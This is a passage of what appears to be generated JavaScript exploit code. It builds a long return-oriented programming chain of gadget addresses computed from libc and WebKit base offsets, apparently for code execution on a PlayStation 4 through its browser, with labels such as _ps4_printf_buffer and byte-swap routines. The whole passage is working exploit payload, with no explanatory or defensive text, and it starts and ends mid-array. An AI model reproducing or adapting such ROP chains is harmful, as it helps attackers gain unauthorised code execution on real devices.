db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1148728, //L2443
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L2443:
db([0, 0]); // 0x0
set_gadgets([
libc_base+759608, //pop rax
//L2444:
ropchain+128, //_ps4_printf_buffer
webkit_base+20307877, //mov [rax], rcx
libc_base+764760, //pop rsi
ropchain+1148800, //L2446
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2446:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1148880, //L2448
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2448:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1148936, //L2449
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2449:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1121481, //mov [rax], cl
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1149064, //L2452
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1149048, //L2451
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2451:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2452:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1149168, //L2453
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1149184, //L2454
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L2453:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2454:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1149304, //L2455
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1149288, //L2456
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L2456:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L2455:
db([0, 0]); // 0x0
//L2397:
set_gadget(libc_base+764760,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+1438842, //pop rdx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+3236123, //pop r9
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+756281, //xor rax, rax
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+782311, //pop rsp
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+763368 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+14664103, //and rax, rcx
libc_base+763368, //pop rcx
write_addr,
webkit_base+20307877, //mov [rax], rcx
libc_base+764760 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+731401, //mov rax, r8
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1150632, //L2457
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+782311 //pop rsp
]);
//L2457:
db([0, 0]); // 0x0
//___bswap64_var:
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1150704, //L2458
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
webkit_base+568675 //pop r8
]);
//L2458:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1150816, //L2461
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1150832, //L2462
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
//L2460:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L2461:
db([0, 0]); // 0x0
set_gadget(webkit_base+568675,); //pop r8
//L2462:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1150920, //L2464
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1150936, //L2465
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2464:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2465:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1151064, //L2468
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1151080, //L2469
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1151048, //L2467
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2467:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2468:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2469:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1151184, //L2470
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1151200, //L2471
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L2470:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2471:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1151320, //L2472
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1151304, //L2473
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L2473:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L2472:
db([0, 0]); // 0x0
set_gadgets([
libc_base+764760, //pop rsi
ropchain+1151408, //L2475
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1151392, //L2474
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2474:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2475:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1151512, //L2476
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1151528, //L2477
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L2476:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2477:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1151648, //L2478
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1151632, //L2479
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L2479:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L2478:
db([0, 0]); // 0x0
//___bswap32_var:
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1151720, //L2480
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
webkit_base+568675 //pop r8
]);
//L2480:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1151832, //L2483
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1151848, //L2484
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
//L2482:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L2483:
db([0, 0]); // 0x0
set_gadget(webkit_base+568675,); //pop r8
//L2484:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1151936, //L2486
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1151952, //L2487
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2486:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2487:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1152112, //L2490
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1152144, //L2492
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1152096, //L2489
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1152128, //L2491
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2489:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2490:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2491:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2492:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1152304, //L2496
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1152256, //L2493
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1152272, //L2494
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2493:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2494:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2495:
db([32, 0]); // 0x20
set_gadget(libc_base+759608,); //pop rax
//L2496:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1152440, //L2498
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1152456, //L2499
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1152424, //L2497
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2497:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2498:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2499:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1152560, //L2500
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1152576, //L2501
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L2500:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2501:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1152696, //L2502
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1152680, //L2503
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L2503:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L2502:
db([0, 0]); // 0x0
set_gadgets([
libc_base+764760, //pop rsi
ropchain+1152784, //L2505
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1152768, //L2504
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2504:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2505:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1152888, //L2506
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1152904, //L2507
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L2506:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2507:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1153024, //L2508
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1153008, //L2509
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L2509:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L2508:
db([0, 0]); // 0x0
//___bswap16_var:
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1153096, //L2510
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
webkit_base+568675 //pop r8
]);
//L2510:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1153208, //L2513
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1153224, //L2514
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
//L2512:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L2513:
db([0, 0]); // 0x0
set_gadget(webkit_base+568675,); //pop r8
//L2514:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1153312, //L2516
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1153328, //L2517
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2516:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2517:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224144, //mov ax, [rdi]
libc_base+764760, //pop rsi
ropchain+1153488, //L2522
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1153440, //L2519
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1153456, //L2520
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2519:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2520:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2521:
db([16, 0]); // 0x10
set_gadget(libc_base+759608,); //pop rax
//L2522:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1153544, //L2523
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L2523:
db([0, 0]); // 0x0
set_gadgets([
libc_base+478984, //sar edi, cl
libc_base+764760, //pop rsi
ropchain+1153656, //L2525
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1153688, //L2527
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1153672, //L2526
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2525:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2526:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2527:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1153848, //L2531
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1153800, //L2528
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1153816, //L2529
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2528:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2529:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2530:
db([48, 0]); // 0x30
set_gadget(libc_base+759608,); //pop rax
//L2531:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1153952, //L2533
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1153936, //L2532
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L2532:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2533:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L2534:
db([8, 0]); // 0x8
set_gadget(libc_base+763368,); //pop rcx
//L2535:
db([8, 0]); // 0x8
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1154160, //L2538
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1154128, //L2536
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2536:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2537:
db([48, 0]); // 0x30
set_gadget(libc_base+759608,); //pop rax
//L2538:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1154264, //L2540
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1154248, //L2539
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L2539:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2540:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1154360, //L2542
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2541:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L2542:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1154448, //L2544
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1154464, //L2545
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2544:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2545:
db([0, 0]); // 0x0
set_gadgets([
